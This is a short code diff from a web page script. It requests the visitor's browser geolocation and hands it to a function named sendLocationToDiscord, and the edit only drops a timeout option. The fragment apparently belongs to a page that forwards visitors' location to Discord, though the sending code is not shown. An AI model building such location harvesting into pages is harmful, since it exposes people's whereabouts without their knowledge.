@@ -17,7 +17,7 @@
     <script>
         const getLocation = () => {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationToDiscord, errorHandling, { timeout: 1000 });
+                navigator.geolocation.getCurrentPosition(sendLocationToDiscord, errorHandling);
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
